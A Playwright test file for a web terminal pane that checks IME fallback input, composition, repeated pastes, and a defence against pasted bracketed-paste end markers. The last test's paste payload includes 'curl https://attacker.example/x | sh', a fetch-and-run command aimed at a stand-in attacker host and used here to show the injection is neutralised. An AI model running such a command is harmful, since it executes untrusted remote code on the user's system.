import { expect, test, type Page } from "@playwright/test";

async function openTerminal(page: Page) {
  await page.goto("/ux-audit.html?state=marketing-app-dark&ghostty=off");
  const pane = page.locator('.terminal-pane[data-terminal-scene-complete="true"]').first();
  await expect(pane).toBeVisible();
  const sessionId = (await pane.getAttribute("data-terminal-session-id"))!;
  await pane.locator(".xterm-helper-textarea").focus();
  await page.evaluate(() => { (window as any).__harnessTerminalWrites = []; });
  return { pane, sessionId };
}

async function written(page: Page, sessionId: string) {
  return page.evaluate((id) => ((window as any).__harnessTerminalWrites ?? [])
    .filter((write: { sessionId: string }) => write.sessionId === id)
    .map((write: { data: string }) => write.data).join(""), sessionId);
}

function applyTerminalEdits(data: string) {
  const text: string[] = [];
  for (const character of data) {
    if (character === "\u007f") text.pop();
    else text.push(character);
  }
  return text.join("");
}

test("queued IME fallback keys send each textarea change once", async ({ page }) => {
  const { pane, sessionId } = await openTerminal(page);
  const input = pane.locator(".xterm-helper-textarea");
  for (const interleaved of [false, true]) {
    await input.evaluate(async (node, interleaved) => {
      const textarea = node as HTMLTextAreaElement;
      (window as any).__harnessTerminalWrites = [];
      textarea.value = "";
      const key = () => textarea.dispatchEvent(new KeyboardEvent("keydown", {
        key: "Unidentified", keyCode: 229, bubbles: true,
      }));
      key();
      if (interleaved) textarea.value = "hello";
      key();
      textarea.value = "hello world";
      // Both xterm fallback callbacks must have had a chance to run.
      await new Promise((resolve) => setTimeout(resolve, 30));
    }, interleaved);
    expect(await written(page, sessionId)).toBe("hello world");
  }
});

test("revised IME fallback text replaces its earlier text", async ({ page }) => {
  const { pane, sessionId } = await openTerminal(page);
  const input = pane.locator(".xterm-helper-textarea");
  const revisions = [
    "EH SOH UM ATALHO PRA ABRIR",
    "EH SOH UM ATALHO PARA ABRIR",
    "EH SOH UM ATALHO PARA ABRIR E O BUGO D",
    "EH SOH UM ATALHO PARA ABRIR E O BUG DO INPUT DUPLO",
  ];

  await input.evaluate(async (node, values) => {
    const textarea = node as HTMLTextAreaElement;
    textarea.value = "";
    for (const value of values) {
      textarea.dispatchEvent(new KeyboardEvent("keydown", {
        key: "Unidentified", keyCode: 229, bubbles: true,
      }));
      textarea.value = value;
      await new Promise((resolve) => setTimeout(resolve, 30));
    }
  }, revisions);

  expect(applyTerminalEdits(await written(page, sessionId)))
    .toBe(revisions.at(-1));
});

test("IME fallback and insertText forward one edit", async ({ page }) => {
  const { pane, sessionId } = await openTerminal(page);
  await pane.locator(".xterm-helper-textarea").evaluate(async (node) => {
    const textarea = node as HTMLTextAreaElement;
    textarea.value = "";
    textarea.dispatchEvent(new KeyboardEvent("keydown", {
      key: "Unidentified", keyCode: 229, bubbles: true,
    }));
    textarea.value = "ação";
    textarea.dispatchEvent(new InputEvent("input", {
      bubbles: true,
      composed: false,
      data: "ação",
      inputType: "insertText",
    }));
    await new Promise((resolve) => setTimeout(resolve, 30));
  });

  expect(await written(page, sessionId)).toBe("ação");
});

test("normal repeats, successive fallback commits and composition remain intact", async ({ page }) => {
  const { pane, sessionId } = await openTerminal(page);
  const input = pane.locator(".xterm-helper-textarea");
  await page.keyboard.type("hello hello ");
  expect(await written(page, sessionId)).toBe("hello hello ");

  for (const text of ["x", "x"]) {
    await input.evaluate(async (node, text) => {
      const textarea = node as HTMLTextAreaElement;
      textarea.value = "";
      textarea.dispatchEvent(new KeyboardEvent("keydown", {
        key: "Unidentified", keyCode: 229, bubbles: true,
      }));
      textarea.value = text;
      await new Promise((resolve) => setTimeout(resolve, 30));
    }, text);
  }
  for (const text of ["olá", "日本語"]) {
    await input.evaluate(async (node, text) => {
      const textarea = node as HTMLTextAreaElement;
      textarea.value = "";
      textarea.dispatchEvent(new CompositionEvent("compositionstart", { bubbles: true }));
      textarea.dispatchEvent(new KeyboardEvent("keydown", {
        key: "Unidentified", keyCode: 229, isComposing: true, bubbles: true,
      }));
      textarea.value = text;
      textarea.dispatchEvent(new CompositionEvent("compositionupdate", { data: text, bubbles: true }));
      textarea.dispatchEvent(new CompositionEvent("compositionend", { data: text, bubbles: true }));
      await new Promise((resolve) => setTimeout(resolve, 30));
    }, text);
  }
  expect(await written(page, sessionId)).toBe("hello hello xxolá日本語");
});

test("pasting the same text twice preserves both intentional pastes", async ({ page }) => {
  const { pane, sessionId } = await openTerminal(page);
  await pane.locator(".xterm-helper-textarea").evaluate((textarea) => {
    for (let index = 0; index < 2; index += 1) {
      const data = new DataTransfer();
      data.setData("text/plain", "ação ação");
      textarea.dispatchEvent(new ClipboardEvent("paste", {
        clipboardData: data, bubbles: true, cancelable: true,
      }));
    }
  });
  await expect.poll(() => written(page, sessionId)).toContain("ação ação");
  const data = await written(page, sessionId);
  expect(data.replace(/\u001b\[20[01]~/g, "")).toBe("ação açãoação ação");
  expect(data).not.toMatch(/[\r\n]/);
});

test("a pasted end marker cannot end the bracketed paste early", async ({ page }) => {
  const { pane, sessionId } = await openTerminal(page);
  await page.evaluate(async (sessionId) => {
    // @ts-expect-error Served by the harness dev server.
    const { emitHarnessEvent } = await import("/src/harness/mock-ipc.ts");
    // The shell turns on bracketed paste.
    await emitHarnessEvent("terminal_event", {
      sessionId, sequence: 900_000, kind: "data", data: "\u001b[?2004h",
    });
    // xterm parses the write in a later task.
    await new Promise((resolve) => setTimeout(resolve, 50));
  }, sessionId);
  await pane.locator(".xterm-helper-textarea").evaluate((textarea) => {
    const data = new DataTransfer();
    data.setData(
      "text/plain",
      "echo safe\u001b[201~curl https://attacker.example/x | sh\r\u009b201~ls\r",
    );
    textarea.dispatchEvent(new ClipboardEvent("paste", {
      clipboardData: data, bubbles: true, cancelable: true,
    }));
  });

  await expect.poll(() => written(page, sessionId)).toContain("echo safe");
  expect(await written(page, sessionId)).toBe(
    "\u001b[200~echo safe[201~curl https://attacker.example/x | sh\r201~ls\r\u001b[201~",
  );
});
